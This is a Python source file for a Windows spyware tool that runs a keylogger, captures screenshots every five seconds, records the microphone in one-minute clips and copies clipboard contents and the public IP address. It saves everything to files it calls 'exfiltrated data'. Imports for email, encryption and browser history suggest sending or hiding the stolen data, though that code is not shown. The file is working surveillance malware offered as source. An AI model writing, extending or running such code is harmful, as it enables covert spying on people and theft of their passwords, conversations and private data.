# Built-in Modules #
import json
import logging
import pathlib
import os
import re
import shutil
import smtplib
import socket
import subprocess
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from datetime import datetime
# External Modules #
import cv2
import requests
import sounddevice
import win32clipboard
import browserhistory as bh
from cryptography.fernet import Fernet
import pyscreenshot as ImageGrab
import schedule
from PIL import ImageGrab
from pynput.keyboard import Listener
from scipy.io.wavfile import write as write_rec




#Function that tracks the keys logged and saves it into a file
def LoggKeys(file_path):
    
    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))

    
    with Listener(on_press=on_press) as listener:
        listener.join()


#Function that takes a screenshot of the primary monitor every 5 seconds and saves it into a file
def Screenshot(file_path):
    # Create directory for screenshot storage #
    
    pathlib.Path('Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = f'{file_path}Screenshots\\'

    for x in range(0, 60):
        # Capture screenshot #
        pic = ImageGrab.grab()
        # Save screenshot to file #
        pic.save(f'{screen_path}screenshot{x}.png')
        time.sleep(5)
    
    

#Function that records the microphone input for 60 second intervals and saves it into a file
def Microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 60
        my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec(f'{file_path}{x}mic_recording.wav', fs, my_recording)




#Function that gathers important information such as the IP address, clipboard contents and browser history
#Includes the multiprocessing code to run all the functions simultaenously
def main():
    # Create storage for exfiltrated data #
    pathlib.Path('').mkdir(parents=True, exist_ok=True)
    file_path = ''


    # Get the hostname #
    hostname = socket.gethostname()
    # Get the IP address by hostname #
    ip_addr = socket.gethostbyname(hostname)

    with open(file_path + 'IP_Address.txt', 'a') as system_info:
      
        public_ip = requests.get('https://api.ipify.org').text

        # Log the public and private IP address #
        system_info.write(f'Public IP Address: {public_ip}\n')

        
    # Copy the clipboard #
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    with open(f'{file_path}clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: \n' + pasted_data)

   

    # Create and start processes #
    p1 = Process(target=LoggKeys, args=(file_path,))
    p1.start()
    
    p2 = Process(target=Screenshot, args=(file_path,))
    p2.start()
   
    p3 = Process(target=Microphone, args=(file_path,))
    p3.start()

    # Join processes with 5 minute timeout #
    p1.join(timeout=300)
    p2.join(timeout=300)
    p3.join(timeout=300)


    # Terminate processes #
    p1.terminate()
    p2.terminate()
    p3.terminate()
 

    


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception(f'* Error Occurred: {ex} *')
        pass